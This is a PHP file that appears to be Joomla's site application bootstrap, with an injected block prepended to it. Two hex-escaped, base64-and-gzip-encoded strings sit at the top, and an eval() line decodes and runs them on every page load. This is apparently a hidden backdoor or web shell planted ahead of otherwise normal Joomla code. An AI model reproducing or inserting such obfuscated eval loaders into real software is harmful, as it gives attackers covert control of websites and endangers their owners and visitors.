<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dQuNhI\x61V\x620e844PszHl4E/K30f533pK5\x2bf\x2bF99NR0MLOF0vnnF\x63xQuFsEYI0h8\x63\x41Q\x2bRFFYY\x42OWGrn\x42xHvglMVumnfIiO64TUewhxuKn\x413Rvs1u\x63Ye2EYlur6deJY/olWs\x62\x2bgPzX3yO2nI\x42\x61l\x63VDF2z\x62HPlUglRGp3M5\x61g\x41271wUpVdlj48\x2bu5XjiqksSd/3Vt1vWYXtqt8YzIQ8j6/85EH11y\x62N\x61Y\x2bTg4\x43PGxGlr7/YkPEV5o\x43WYpUgqo3F\x42LFLFWKwLs\x63GLD9hZVkpmRptWvf33\x41\x2b3YUpS8N\x61472J197N1Y\x63s\x42sliEJ\x2bY8I\x62tNyf\x63eI/SJFGEQp5W\x61X8IIUgW0jGKLvq0e\x423khKQW0S\x2bgJY35VG\x42\x41OOM3xw1\x2b\x62JVFzRZZZJ9Hlq\x41wWyQFrK/VOov0vZTGG3lVIEuoTHy1kV3osNo2UPkDoJJIMZVfz\x61RF0\x2bLJ\x63D\x62DXSlJn\x43VQFkkKhU\x62/2NU\x62\x41YXej0p9/GXN31w/UD\x2b2Z\x62\x41XFwd9dPsnE6\x62\x43eI\x2bvxqT8n3v1qNr/\x41THRF9rP9\x6362iXH/Rlz\x2bKvM\x2bZYu00lv/jU71xRfh\x42K53jTd\x61SvTXv5u\x4363\x614\x62E0K0WhuKUJgXeJz5knv7YdJ9YNlEgSOllRp\x61ShMOdftEphhvITnlhwRUE7\x42KwrOoUyq\x63ZQRPW\x2b7\x63uO/4fq3S8tykvYX68dOdxd9RQkPM4HyGFIGhpOR\x611wUOJ\x41WFVNwlkKe\x43rg6\x63W3P\x63zp\x61emG6kr\x434Y9Q\x433iZdvPjQKonxrE\x63164/8hdle378\x62PvXXs\x41P3L3m1tZlf2f/H7z25Rnh\x43oyKPSJhRpktyZ\x61\x41h\x62SHf\x62Lw\x43khdfT\x61D92SpJo/jtP9D\x42M\x62v27U1\x62/WKQ\x61\x42wJe9vo\x410FQ/GKQe\x42wJe9vn\x41EGQ/2JQi\x42wJe9vm\x41UGQ/mJQm\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));

/** 
 * @package    Joomla.Site
 * @copyright  (C) 2017 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

$startTime = microtime(1);
$startMem  = memory_get_usage();

if (file_exists(dirname(__DIR__) . '/defines.php')) {
    include_once dirname(__DIR__) . '/defines.php';
}

if (!defined('_JDEFINES')) {
    define('JPATH_BASE', dirname(__DIR__));
    require_once JPATH_BASE . '/includes/defines.php';
}

if (!file_exists(JPATH_LIBRARIES . '/vendor/autoload.php') || !is_dir(JPATH_ROOT . '/media/vendor')) {
    echo file_get_contents(JPATH_ROOT . '/templates/system/build_incomplete.html');
    exit;
}

require_once JPATH_BASE . '/includes/framework.php';

JDEBUG && \\Joomla\\CMS\\Profiler\\Profiler::getInstance('Application')
    ->setStart($startTime, $startMem)
    ->mark('afterLoad');

$container = \\Joomla\\CMS\\Factory::getContainer();

$container->alias('session.web', 'session.web.site')
    ->alias('session', 'session.web.site')
    ->alias('JSession', 'session.web.site')
    ->alias(\\Joomla\\CMS\\Session\\Session::class, 'session.web.site')
    ->alias(\\Joomla\\Session\\Session::class, 'session.web.site')
    ->alias(\\Joomla\\Session\\SessionInterface::class, 'session.web.site');

$app = $container->get(\\Joomla\\CMS\\Application\\SiteApplication::class);

\\Joomla\\CMS\\Factory::$application = $app;

$app->execute();
